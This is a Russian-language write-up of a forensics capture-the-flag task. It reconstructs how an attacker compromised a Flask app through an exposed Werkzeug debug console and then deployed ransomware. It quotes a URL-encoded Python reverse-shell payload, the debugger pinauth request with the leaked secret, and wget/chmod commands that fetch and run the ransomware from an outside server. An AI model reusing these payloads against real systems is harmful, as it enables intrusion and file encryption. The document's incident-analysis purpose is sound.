
# Условие 1
14. Враг врага 2 - 1

Разведка донесла, что APT «Таймырский муксун» недавно провернул изящную операцию против «Таежного кролика». Поговаривают, что в инфраструктуру «Кролика» было внедрено вредоносное ПО, которое успело наделать шума. Теперь наша задача — докопаться до истины. Вперёд, охотники за «кроличьими» секретами!

Необходимые файлы должны быть на вашем оборудовании. К заданию относится образ linux системы.

- 1. Как был получен первичный доступ к системе? (2 балла)

# Ответ 1

### Открытие консоли (пакет 565-566) спустя 11 секунд после открытия главной страницы сайта:

http://10.10.10.3:5000/console?__debugger__=yes&cmd=resource&f=debugger.js

### Python реверс шелл (пакет 761) на порт 9001:

http://10.10.10.3:5000/console?&__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.10.12%22%2C9001))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22bash%22)&frm=0&s=yqqPfQiFZmXsmnZQYMPF

```
root@7a5a67189bc9:/app#
```

---

# Условие 2

15. Враг врага 2 - 2

- 2. С каких IP-адресов поступала полезная нагрузка? (2 балла)

# Ответ 2

Атака с `10.10.10.12` через `10.10.10.3`

С сервера `81.177.221.242` было скачано приложение-шифровальщик `app`

---

# Условие 3

16. Враг врага 2 - 3

- 3. Какие механизмы защиты от детектирования применены в вредоносном приложении? (4/8 баллов)

# Ответ 3

```
CUSTOM_write found, patched.
ok
```

Runtime-patching чтобы использовать CUSTOM_write() вместо write() чтобы спрятаться от AppArmor'а (или еще чего-то) на сервере

По аналогии с [linux-anti-debugging](https://github.com/tobyxdd/linux-anti-debugging/tree/master)

---

# Условие 4

17. Враг врага 2 - 4

- 4. В какое время было начато исполнение вредоносной нагрузки? (13 баллов)

# Ответ 4

Примерно с пакета 945 (Jan 22 22:34:49) (с удаления всех файлов в домашней директории):
```
rm .*
```
Вредоносное приложение было запущено с пакета 1426 (Jan 22 22:35:52):
```
cd ..
wget http://81.177.221.242:8125/app
chmod +x ./app
./app
```

---

# Условие 5

18. Враг врага 2 - 5

- 5. Какая строчка была использована в качестве SECRET поля для уязвимого сервиса? (20 баллов)

# Ответ 5

### Пакет 577 (22:33:21):
```
<!doctype html>
<html lang=en>
  <head>
    <title>Console // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = true,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "yqqPfQiFZmXsmnZQYMPF";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>Interactive Console</h1>
<div class="explanation">
In this console you can execute Python expressions in the context of the
application.  The initial namespace was created by the debugger automatically.
</div>
<div class="console"><div class="inner">The Console requires JavaScript.</div></div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>
```

Далее эта же строка в параметре s= в 172.18.0.3:5000/console используется для входа в python консоль вместе с муляжом пин-кода (Пакет 693 (22:33:24) ):

```
GET /console?__debugger__=yes&cmd=pinauth&pin=123-456-789&s=yqqPfQiFZmXsmnZQYMPF HTTP/1.1
Host: 10.10.10.3:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.3:5000/console
Connection: keep-alive
Cookie: hide-dotfile=no
Priority: u=0
```

---

# Условие 6

19. Враг врага 2 - 6

- 6. Опишите принцип работы и тип вредоносной нагрузки? (20 баллов)

# Ответ 6

Вручную удалены все файлы из домашнего каталога через `rm .*`

Все что осталось было зашифровано (то есть веб приложение) с помощью скачанного через `wget` приложения `app`

### Принцип работы `app`:

По аналогии с [linux-anti-debugging](https://github.com/tobyxdd/linux-anti-debugging/tree/master) приложение подменяет системные вызовы, вероятно чтобы не быть обнаруженным AppArmor'ом или еще чем-то (пакет 1433 (22:35:52) ):
```
CUSTOM_write found, patched.
ok
```

Далее приложение шифрует все файлы в своей и дочерних директориях, меняя их название с {name} на {name}.enc (пакет 1535 (Jan 22 22:35:52) ):
```
Encrypting .//app: Encrypting .//ioal/app/docker-compose.yml: Encrypting .//ioal/app/server/requirements.txt: Encrypting .//ioal/app/server/wait-for-postgres.sh: Encrypting .//ioal/app/server/Dockerfile: Encrypting .//ioal/app/server/templates/index.html: Encrypting .//ioal/app/server/__init__.py: Encrypting .//ioal/app/server/assets/css/listr.pack.css: Encrypting .//ioal/app/server/assets/css/custom.css: Encrypting .//ioal/app/server/assets/css/jquery.filer.css: Encrypting .//ioal/app/server/assets/fonts/fontawesome-webfont.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.ttf: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer-preview.html: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.svg: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.eot: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.woff: Encrypting .//ioal/app/server/assets/fonts/jquery.filer-icons/jquery-filer.cs
"\
```

```
.
├── app.enc
└── ioal
    ├── app
    │   ├── docker-compose.yml.enc
    │   ├── init.sql
    │   ├── init.sql.enc
    │   └── server
    │       ├── assets
    │       │   ├── css
    │       │   │   ├── custom.css.enc
    │       │   │   ├── jquery.filer.css.enc
    │       │   │   └── listr.pack.css.enc
    │       │   ├── fonts
    │       │   │   ├── fontawesome-webfont.svg.enc
    │       │   │   ├── fontawesome-webfont.ttf.enc
    │       │   │   ├── fontawesome-webfont.woff.enc
    │       │   │   └── jquery.filer-icons
    │       │   │       ├── jquery-filer.css.enc
    │       │   │       ├── jquery-filer.eot.enc
    │       │   │       ├── jquery-filer-preview.html.enc
    │       │   │       ├── jquery-filer.svg.enc
    │       │   │       ├── jquery-filer.ttf.enc
    │       │   │       └── jquery-filer.woff.enc
    │       │   └── js
    │       │       ├── bootstrap.min.js.enc
    │       │       ├── custom.js.enc
    │       │       ├── jquery.base64.min.js.enc
    │       │       ├── jquery.filer.min.js.enc
    │       │       ├── jquery.min.js.enc
    │       │       ├── listr.pack.js.enc
    │       │       └── tether.min.js.enc
    │       ├── Dockerfile.enc
    │       ├── __init__.py.enc
    │       ├── requirements.txt.enc
    │       ├── static
    │       │   └── img
    │       ├── templates
    │       │   └── index.html.enc
    │       └── wait-for-postgres.sh.enc
    ├── Desktop
    ├── Documents
    ├── Downloads
    ├── Music
    ├── Pictures
    ├── Public
    ├── snap
    │   ├── firefox
    │   │   ├── 4793
    │   │   ├── common
    │   │   └── current -> 4793
    │   ├── firmware-updater
    │   │   ├── 127
    │   │   ├── 147
    │   │   ├── common
    │   │   └── current -> 147
    │   └── snapd-desktop-integration
    │       ├── 178
    │       │   ├── Desktop
    │       │   ├── Documents
    │       │   ├── Downloads
    │       │   ├── Music
    │       │   ├── Pictures
    │       │   ├── Public
    │       │   ├── Templates
    │       │   └── Videos
    │       ├── common
    │       └── current -> 178
    ├── Templates
    └── Videos
```

Тип вредоноса: Шифровальщик или шифровальщик-вымогатель (ransomware)
